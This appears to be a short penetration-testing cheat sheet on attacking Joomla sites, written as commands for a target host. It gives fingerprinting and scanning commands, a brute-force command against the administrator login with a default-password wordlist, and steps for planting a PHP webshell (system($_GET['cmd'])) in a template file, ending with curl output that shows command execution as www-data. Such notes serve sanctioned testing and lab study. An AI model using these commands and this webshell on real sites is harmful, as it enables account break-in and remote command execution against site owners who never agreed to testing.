## Jommla

Interesting File(s) : 
- /robots.txt

```bash
$ curl -s http://$TARGET/ | grep Joomla
$ curl -s http://$TARGET/README.txt | head -n 5
$ curl -s http://$TARGET/administrator/manifests/files/joomla.xml | xmllint --format -
```

https://github.com/OWASP/joomscan
https://github.com/drego85/JoomlaScan

```bash
$ sudo pip3 install droopescan
$ droopescan -h
$ droopescan scan joomla --url http://$TARGET/

$ python2.7 joomlascan.py -u http://$TARGET
$ python3 joomla-brute.py -u http://$TARGET -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
 ```

As administrateur, we can edit template & modèles to add a webshell or reverse shell (same as wordpress) :

```php
http://$TARGET/administrator/index.php?option=com_templates&view=template&id=506&file=L2Vycm9yLnBocA%3D%3D
system($_GET['cmd']);
```

```bash
curl -s http://$TARGET/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```